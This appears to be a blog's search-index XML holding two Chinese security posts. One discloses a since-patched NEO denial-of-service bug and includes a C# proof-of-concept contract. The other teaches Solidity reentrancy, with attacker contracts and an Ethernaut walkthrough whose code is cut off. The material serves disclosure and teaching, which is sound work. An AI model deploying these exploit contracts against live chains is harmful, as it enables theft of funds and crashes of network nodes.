<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[0day-NEO智能合约平台Runtime.Notify调用拒绝服务漏洞]]></title>
      <url>/2018/09/15/0day-NEO%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%B9%B3%E5%8F%B0Runtime.Notify()%E8%B0%83%E7%94%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>— 发现的第一个0day —</p>
<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr>

<p>在实验室改以太坊的智能合约到neo。<br>改着改着发现一个拒绝服务攻击漏洞，利用攻击的话危害还挺大的，emmm，发现基本全靠运气，在此记录第一个0day。</p>
<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><hr>

<p><strong>漏洞名称</strong>：NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞<br><strong>漏洞影响</strong>：导致Neo链上所有开启<code>log模式</code>的全节点崩溃（包括共识节点）。<br><strong>漏洞细节</strong>：出现在neo全节点虚拟机中执行智能合约语句Runtime.Notify()时发生崩溃</p>
<p>Neo智能合约平台为合约提供了记录数据信息输出到文件的系统调用<code>System.Runtime.Notify</code>。该调用在处理合约请求时未考虑到全部可能的数据结构，将导致智能合约系统平台crash。</p>
<p>其产生的影响会根据节点的部署情况而有所不同，但是都较为严重。</p>
<p>由于Neo目前是有7个主节点负责验证并打包全网交易。恶意用户将利用该漏洞的恶意合约发布到neo网络中，假如超过4个主节点开启了LOG功能，这些节点在解析运行该恶意合约时将引发崩溃，无法继续达成共识，进而导致整个neo网络拒绝服务。</p>
<p>即使主节点不使用LOG可以完成共识正常出块，但是NEO链中所有NEP5代币智能合约都会使用LOG功能，几乎所有DAPP也会使用LOG功能。所有LOG节点崩溃，会使基于NEO链的大部分智能合约瘫痪。</p>
<p>崩溃截图：<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fv94rl0idqj30gq0an0td.jpg" alt="崩溃截图"></p>
<h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>在执行Runtime.Notify没有考虑所有可能被 Runtime.Notify 写入日志文件的数据类型，在数据转化时解析出错。</p>
<p>Runtime.Notify 是记录智能合约日志的功能，可以输出想要知道的数据的值。类似于<code>console.log()</code>，输出的数据会写入LevevlDB数据库，最后变为一个文件。</p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fv95qd5r2vj30op088t9n.jpg" alt=""></p>
<p>判断是否是log模式</p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fv95n8ki1dj30p40ag75w.jpg" alt=""></p>
<p>构建文件，写入文件</p>
<p>其中<code>ToParameter函数</code>在转化Map格式时崩溃。</p>
<blockquote>
<p>官方回复：因为ToParameter函数在实现的时候还没有Map，后来做了Map功能后忘记更新ToParameter了。</p>
</blockquote>
<p>ToParameter函数，在官方github中的NEO项目中<code>ContractParameter.cs</code>、<code>ContractParameterType.cs</code>、<code>Helper.cs</code>实现</p>
<h2 id="漏洞攻击过程"><a href="#漏洞攻击过程" class="headerlink" title="漏洞攻击过程"></a>漏洞攻击过程</h2><p><code>攻击过程</code>：</p>
<ul>
<li>构建恶意智能合约代码</li>
<li>部署智能合约</li>
<li>调用恶意智能合约</li>
<li>所有开启log功能的节点同步区块,执行智能合约代码，崩溃。（如果共识节点开启log功能，会直接崩溃，不会产生区块）</li>
</ul>
<p>当时提交的智能合约POC分析：<br>（复杂版，当时没有去看源码觉得有两种漏洞原因，以为可能是跟360找到的漏洞一样，因为map与struct嵌套导致漏洞，也有可能是因为其中一种结构，没有排除到根本）</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> Neo.SmartContract.Framework;</div><div class="line"><span class="keyword">using</span> Neo.SmartContract.Framework.Services.Neo;</div><div class="line"><span class="keyword">using</span> Neo.SmartContract.Framework.Services.System;</div><div class="line"><span class="keyword">using</span> Helper = Neo.SmartContract.Framework.Helper;</div><div class="line"><span class="keyword">using</span> System;</div><div class="line"><span class="keyword">using</span> System.Numerics;</div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">NeoContract1</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">test</span> : <span class="title">SmartContract</span></div><div class="line">    &#123;</div><div class="line"></div><div class="line">        <span class="comment">//结构体</span></div><div class="line">        <span class="comment">//以 (byte[]) fileid - (结构体) Upload 为键值对 的 Map结构 （map_Up开头）</span></div><div class="line">        <span class="comment">//以 (byte[]) fileid - (结构体) Purchase 为键值对 的 Map结构 </span></div><div class="line"></div><div class="line">        <span class="comment">// Upload结构体</span></div><div class="line">        <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Upload</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] fileID; <span class="comment">// fileID</span></div><div class="line">            <span class="keyword">public</span> Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu;   <span class="comment">//Map结构</span></div><div class="line">        &#125;</div><div class="line">        <span class="comment">//Purchase结构体</span></div><div class="line">        <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Purchase</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] fileID;</div><div class="line">        &#125;</div><div class="line">.....省略合约入口.........</div><div class="line">        <span class="comment">//攻击调用</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">Attack</span>(<span class="params"><span class="keyword">byte</span>[] fileID</span>)</span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu = <span class="keyword">new</span> Map&lt;<span class="keyword">byte</span>[], Purchase&gt;();</div><div class="line">            <span class="comment">//新建Purchase结构体</span></div><div class="line">            Purchase pu = <span class="keyword">new</span> Purchase</div><div class="line">            &#123;</div><div class="line">                fileID = fileID,</div><div class="line">            &#125;;</div><div class="line">            map_Pu[fileID] = pu;</div><div class="line">            <span class="comment">//新建外部upload结构体</span></div><div class="line">            Upload up = <span class="keyword">new</span> Upload</div><div class="line">            &#123;</div><div class="line">                fileID = fileID,</div><div class="line">                map_Pu = map_Pu,</div><div class="line">            &#125;;</div><div class="line">            <span class="comment">//存储upload结构体</span></div><div class="line">            StorageMap map_Up = Storage.CurrentContext.CreateMap(<span class="string">"map_Up"</span>);</div><div class="line">            map_Up.Put(fileID, up.Serialize());</div><div class="line"></div><div class="line">            Runtime.Notify(<span class="string">"OK"</span>);</div><div class="line"></div><div class="line">            <span class="comment">//得到fileID对应的Upload</span></div><div class="line">            Upload map_fileID = GetUpload(fileID);</div><div class="line">            <span class="comment">//问题出在这里！！！！！！！！！！！！！！！！此处崩溃</span></div><div class="line">            Runtime.Notify(map_fileID);</div><div class="line">            Runtime.Notify(map_fileID.fileID);</div><div class="line">            <span class="comment">//估计就是两句中上面的第一句</span></div><div class="line">            <span class="comment">//可能1. 一个结构体 因为结构中的非法字符 在解析写入文件的时候 导致崩溃 （可能因为结构体 其中包含着不在预期估计范围的作为结构体分割 的字符）</span></div><div class="line">            <span class="comment">//可能2. 一个多层嵌套 map struct 的结构体 因为多层嵌套的原因 在解析没有预计 导致崩溃</span></div><div class="line"></div><div class="line">            <span class="comment">//得到upload的map_Pu 中对应</span></div><div class="line">            Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu_2 = map_fileID.map_Pu;</div><div class="line">            Runtime.Notify(map_Pu_2[fileID]);</div><div class="line"></div><div class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Upload <span class="title">GetUpload</span>(<span class="params"><span class="keyword">byte</span>[] fileID</span>)</span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            StorageMap map_Up = Storage.CurrentContext.CreateMap(<span class="string">"map_Up"</span>);</div><div class="line"></div><div class="line">            <span class="keyword">var</span> bytes = map_Up.Get(fileID);</div><div class="line">            <span class="keyword">if</span> (bytes.Length &gt; <span class="number">0</span>)</div><div class="line">            &#123;</div><div class="line">               <span class="keyword">return</span> Helper.Deserialize(bytes) <span class="keyword">as</span> Upload;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Upload();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>按照官方的原因的话，应该直接建立一个MAP结构，Runtime.Notify(MAP)格式，就可以，不用向上面那么复杂</p>
<p>贴上攻击结果的一些截图：</p>
<p>共识节点开启log：<br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fv96cituh5j311x0k57ts.jpg" alt=""></p>
<p>共识节点不开启log：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fv96cv6vy6j311y0k81kb.jpg" alt=""></p>
<h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><p>官方于09.10修补了漏洞,添加了map对应处理情况。<a href="https://github.com/neo-project/neo/commit/e5e64ad5d413ad53effb6f815eac579df2c3aaf9#diff-724a2c89065b167abd6abdd780331db8" target="_blank" rel="external">修复情况链接</a></p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fv98b8qv3ij30ef09vt9c.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fv97ec5hi5j30o80g6t9q.jpg" alt=""></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>很感谢学长和老师（就不贴出名字了）引入门的指导，一直以来的支持和照顾。这也是能发现0day不可或缺的先前条件。</p>
<p>信息安全就是如此，潜心学习，沉淀，耐心研究，挖掘，总有收获。<br>共勉。</p>
]]></content>
      
        
        <tags>
            
            <tag> 0day漏洞 </tag>
            
            <tag> NEO </tag>
            
            <tag> 区块链 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[智能合约安全-重入攻击]]></title>
      <url>/2018/08/29/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<p>— 有意思，填一小块坑 —</p>
<a id="more"></a>
<hr>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直挖着关于智能合约安全问题的坑放在自己的博客列表里，包括什么RPC20代币啦，智能合约函数使用啦，巴拉巴拉。但是一直整块时间去整理。</p>
<p>今天知道了个有意思的跟CTF题目一样的<a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="external">智能合约漏洞合集网站</a>。做了其中重入攻击的部分。很有意思，还尝试用了下Remix。之后考虑把它刷完。</p>
<p>那么回归重点。</p>
<hr>

<h1 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h1><p><strong>重入攻击</strong>是一种由于solidity智能合约的特性，再加上智能合约编写不当导致的漏洞。</p>
<p>用一句话来概括就是，攻击者会编写攻击智能合约，调用受害合约，利用自己的Fallback函数，循环调用一段受害者合约的代码。由于是因为重复进入受害者合约执行一段代码导致的漏洞，就叫做<strong>重入攻击</strong>。</p>
<p>在继续之前，我们列出需要解决的问题：</p>
<ul>
<li>attack(攻击者合约)如何重入victim(受害者合约)</li>
<li>为什么attack重入了victim，就会导致漏洞。</li>
</ul>
<p>先解决第一个问题，为什么会重入？</p>
<h2 id="因-Fallback、足够Gas-重入"><a href="#因-Fallback、足够Gas-重入" class="headerlink" title="因 Fallback、足够Gas 重入"></a>因 Fallback、足够Gas 重入</h2><p>受害者合约<code>Victim.sol</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.8</span>;</div><div class="line"></div><div class="line">contract Victim &#123;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    uint transferAmt = <span class="number">1</span> ether; </div><div class="line">    <span class="keyword">if</span> (!msg.sender.call.value(transferAmt)()) <span class="keyword">throw</span>; </div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>以上是一个典型的会导致重入的智能合约。</p>
<p><code>withdraw</code>函数完成了存储在Victim合约中的代币的撤回功能。调用一次，就会转账<code>1 ether</code>到调用者用户。此处的重入攻击会导致调用一次<code>withdraw()</code>转出不只<code>1 ether</code>的钱。<br>（虽然来说这个合约，攻击者完全可以多次调用withdraw来慢慢转钱，但是只是为了演示的智能合约，不用太计较）</p>
<p>关键原因就是使用<code>call.value()</code>转账，但在此之前需要了解一下<strong>Fallback函数</strong></p>
<p>首先我们要知道，转账是可以转钱到一个智能合约地址或者一个账户地址。这两个是有所区别的————Fallback函数</p>
<blockquote>
<p>合约可以有一个未命名的函数————<a href="https://solidity-cn.readthedocs.io/zh/develop/contracts.html#fallback" target="_blank" rel="external">Fallback函数</a>。这个函数不能有参数也不能有返回值。 如果在一个到合约的调用中，没有其他函数与给定的函数标识符匹配（或没有提供调用数据），那么这个函数（fallback 函数）会被执行。</p>
<p>除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币，fallback 函数必须标记为 payable。 如果不存在这样的函数，则合约不能通过常规交易接收以太币。</p>
<p>在这样的上下文中，通常只有很少的 gas 可以用来完成这个函数调用（准确地说，是 2300 gas），所以使 fallback 函数的调用尽量廉价很重要。 请注意，调用 fallback 函数的交易（而不是内部调用）所需的 gas 要高得多，因为每次交易都会额外收取 21000 gas 或更多的费用，用于签名检查等操作。</p>
</blockquote>
<p>利用Fallback函数，我们就可以使victim调用攻击合约Fallback函数中的任意代码，但是这是智能合约合理的一些特性。因为如果没有足够的Gas，是不足以支持不断重入的。<code>call.value()</code>转账给了我们足够的Gas。</p>
<blockquote>
<p><code>&lt;address&gt;.transfer(uint256 amount)</code>:<br>向 地址类型 发送数量为 amount 的 Wei，失败时抛出 <strong>异常</strong>，发送 2300 gas 的矿工费，不可调节。</p>
<p><code>&lt;address&gt;.send(uint256 amount)</code>(bool):<br>向 地址类型 发送数量为 amount 的 Wei，失败时返回 <strong>false</strong>，发送 2300 gas 的矿工费用，不可调节。</p>
<p><code>&lt;address&gt;.call(...)</code> (bool):<br>发出低级函数 CALL，失败时返回 false，发送所有可用 gas，可调节。<br><code>.call</code>函数添加<code>.value</code>会附加上代币，形成转账</p>
</blockquote>
<p>可以看出<code>call.value</code>与<code>transfer</code>和<code>send</code>不同，会发送目前拥有的全部的gas，从而使智能合约有足够的gas不断重入。</p>
<h2 id="编写攻击合约"><a href="#编写攻击合约" class="headerlink" title="编写攻击合约"></a>编写攻击合约</h2><p>那么在攻击合约中使用<strong>payable fallback函数</strong>配合受害合约的转账函数发送全部的Gas。我们就可以有足够的Gas去执行自己的代码————重入。</p>
<p>在payable fallback函数中，我们选择继续调用受害者合约的<code>withdraw()</code>,再配合一些控制就可以任意通过一次调用，转账出任意多的代币。</p>
<p><code>attack.sol</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.8</span>;</div><div class="line"><span class="comment">//引入受害合约</span></div><div class="line"><span class="keyword">import</span> <span class="string">'./Victim.sol'</span>;</div><div class="line"><span class="comment">//攻击</span></div><div class="line">contract Attacker &#123;</div><div class="line">  <span class="comment">//受害合约实例</span></div><div class="line">  Victim v;</div><div class="line">  <span class="comment">//重入次数</span></div><div class="line">  uint public count;</div><div class="line">  <span class="comment">//日志</span></div><div class="line">  event LogFallback(uint c, uint balance);</div><div class="line">  <span class="comment">//初始化函数</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Attacker</span>(<span class="params">address victim</span>) </span>&#123;</div><div class="line">    v = Victim(victim);</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//攻击函数</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    v.withdraw();</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//payable fallback函数</span></div><div class="line">  <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</div><div class="line">    count++;</div><div class="line">    <span class="comment">//记录日志</span></div><div class="line">    LogFallback(count, <span class="keyword">this</span>.balance);</div><div class="line">    <span class="comment">//限制转出10个代币</span></div><div class="line">    <span class="keyword">if</span> (count &lt; <span class="number">10</span>) &#123;</div><div class="line">      v.withdraw();</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这样子，只需要攻击函数的attack()，我们就可以得到10个ether</p>
<p>当然，我们目前做的看起来没有意义。我们只是解决了第一个问题：attack(攻击者合约)如何重入victim(受害者合约)？</p>
<p>那么为什么attack重入了victim，就会导致漏洞转钱很多次？真实情况可不会向之前的合约一样，调用一次就返回给你钱。你调用很多次，就给你很多钱。肯定会有所限制。</p>
<h2 id="资产记录的修改在转币之后"><a href="#资产记录的修改在转币之后" class="headerlink" title="资产记录的修改在转币之后"></a>资产记录的修改在转币之后</h2><p>取<a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="external">重入题目</a>部分，这更符合真实的场景，也引入重入攻击另一个重要的形成条件。</p>
<p><code>victim智能合约</code>关键部分如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//账户存储的代币数量（用户账单）</span></div><div class="line">mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</div><div class="line"><span class="comment">//撤回钱，从账上化除</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</div><div class="line">        <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</div><div class="line">            _amount;</div><div class="line">        &#125;</div><div class="line">        balances[msg.sender] -= _amount;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//收取钱，记账</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</div><div class="line">  balances[_to] += msg.value;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这是一个可以接受撤回代币的智能合约。其中有重入漏洞，可以导致一次调用withdraw，多于记录的钱。</p>
<p>分析其流程：</p>
<ul>
<li>判断账目中钱是否够 Y</li>
<li>转钱</li>
<li>扣除账目中的钱</li>
</ul>
<p>咋一看没什么问题。其中的关键部分就在于 <code>balances[msg.sender] -= _amount;</code>————<strong>资产记录的修改在转币之后</strong> 。</p>
<p>通常来说，其他语言中这么写问题也不大，因为是同一个函数中，逐步执行的。但是在智能合约中，转账到别人的智能合约中，会调用别的智能合约的fallback函数，就会形成风险。</p>
<p>在结合之前的重入：<code>.call.value</code>转账导致重入 + <code>资产记录的修改在转币之后</code> 导致重入绕过验证，就可以形成恶意转账，掏空智能合约的所有代币。</p>
<p>分析其攻击流程（以两层来举例）：</p>
<ul>
<li>F1)判断账目中钱是否够 Y</li>
<li>F1)转钱</li>
<li>进入攻击函数的fallback函数，重新调用</li>
<li>F2)判断账目中钱是否够 Y</li>
<li>F2)转钱</li>
<li>F2)扣除账目中的钱</li>
<li>返回攻击函数的fallback函数</li>
<li>返回原函数</li>
<li>F1)扣除账目中的钱</li>
<li>形成溢出</li>
</ul>
<hr>

<h1 id="ethernaut重入题"><a href="#ethernaut重入题" class="headerlink" title="ethernaut重入题"></a>ethernaut重入题</h1><p><a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="external">重入题目</a></p>
<h2 id="基于Remix"><a href="#基于Remix" class="headerlink" title="基于Remix"></a>基于Remix</h2><p><a href="http://remix.ethereum.org/#optimize=true&amp;version=soljson-v0.4.18+commit.9cf6e910.js" target="_blank" rel="external">Remix在线环境</a></p>
<p>目标就是从智能合约中偷走全部的钱。<br>以下是目标智能合约代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</div><div class="line"><span class="comment">//合约</span></div><div class="line">contract Reentrance &#123;</div><div class="line">  <span class="comment">//账本</span></div><div class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</div><div class="line">  <span class="comment">//收钱记账</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</div><div class="line">    balances[_to] += msg.value;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//查看账本</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> balances[_who];</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//取钱销账</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</div><div class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</div><div class="line">        _amount;</div><div class="line">      &#125;</div><div class="line">      balances[msg.sender] -= _amount;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//fallback收钱函数</span></div><div class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>思路比较明显：</p>
<ul>
<li>先构造一个攻击合约</li>
<li>攻击合约触发donate，存入一小部分钱，使之可以满足withdaw的if判断</li>
<li>攻击合约触发withdraw退钱<ul>
<li>通过if判断</li>
<li><code>address.call.value()()</code>转钱进入攻击合约</li>
<li>执行攻击合约的payable fallback函数的内容</li>
<li>递归 进入合约的withdraw函数，触发退钱</li>
</ul>
</li>
<li>由于call方法是发送全部的gas。会一直执行到合约被榨干，没有足够的钱，转钱失败。或者gas不够，攻击失败，回滚。</li>
<li>当转钱失败，执行递归的最里面一层的<code>balances[msg.sender] -= _amount;</code></li>
<li>一层层回退，不断执行减操作，导致balances[]溢出，变为巨大整数。</li>
</ul>
<p>攻击合约构造要点：</p>
<ul>
<li>需要引用目标合约</li>
<li>需要一个函数触发donate</li>
<li>需要一个函数触发withdraw表示攻击开始</li>
<li>需要一个函数提取出攻击得到的钱</li>
</ul>
<p><strong>坑点</strong>：自己写攻击合约，发现无论怎么样都是失败，也不知道为啥。之后不断翻别人writeup。发现攻击函数中需要调用withdraw两次才能进入payable fallback函数。自己试验了一下，还真是这样，试验截图如下。</p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fuud1opdicj309w065q2v.jpg" alt="cr1.png"></p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fuud1w4vonj30e304k743.jpg" alt="cr2.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fuud21cja7j30a0060743.jpg" alt="cr3.png"></p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fuud24vl1oj30g8046wea.jpg" alt="cr4.png"></p>
<p>number为重入次数，instance为受害者合约地址，另一个是攻击合约地址</p>
<p>完全不知道原因，感觉原理也很底层，也就不深究了。<br>贴上攻击代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</div><div class="line"> </div><div class="line"> <span class="comment">//引入目标合约内容</span></div><div class="line"> contract Reentrance &#123;</div><div class="line"> </div><div class="line"><span class="comment">//.... 和上文一模一样的内容 ....</span></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//自己的攻击合约</span></div><div class="line">contract MyContract &#123;</div><div class="line">    <span class="comment">//目标合约实例</span></div><div class="line">    Reentrance c;</div><div class="line">    <span class="comment">//合约拥有者</span></div><div class="line">    address owner;</div><div class="line">    <span class="comment">//进入payable fallback函数的次数</span></div><div class="line">    uint public number;</div><div class="line"></div><div class="line">    <span class="comment">//初始化函数</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MyContract</span>(<span class="params">address _c</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</div><div class="line">        <span class="comment">//链接至目标合约</span></div><div class="line">        c = Reentrance(_c);</div><div class="line">        <span class="comment">//确认合约所有者，用于最后取钱</span></div><div class="line">        owner = msg.sender;</div><div class="line">        <span class="comment">//直接完成donate步骤，在创建合约时，给一些钱</span></div><div class="line">        c.donate.value(msg.value)(<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//payable fallback 函数</span></div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span 